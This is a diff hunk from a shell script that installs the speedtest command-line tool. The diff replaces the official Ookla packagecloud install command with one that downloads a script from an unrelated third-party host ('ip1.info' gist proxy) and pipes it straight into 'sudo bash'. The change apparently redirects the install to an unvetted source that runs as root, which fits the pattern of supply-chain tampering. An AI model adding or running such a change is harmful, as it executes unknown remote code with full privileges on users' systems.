@@ -57,7 +57,7 @@ if ! command -v speedtest &> /dev/null; then
         sudo apt-get install curl
     fi
     echo -e "${GREEN}Speedtest is not installed. Installing...${NC}"
-    curl -s https://packagecloud.io/install/repositories/ookla/speedtest-cli/script.deb.sh | sudo bash
+    curl -L "https://ip1.info/gist_dl/index.php?gist_id=299338de5b9a8a7d40a0f0c48a9f47a6&filename=speedtest-cli-install.sh" | sudo bash
     sudo apt-get install -y speedtest
     echo -e "Preparing speedtest..."
     speedtest --accept-gdpr &> /dev/null
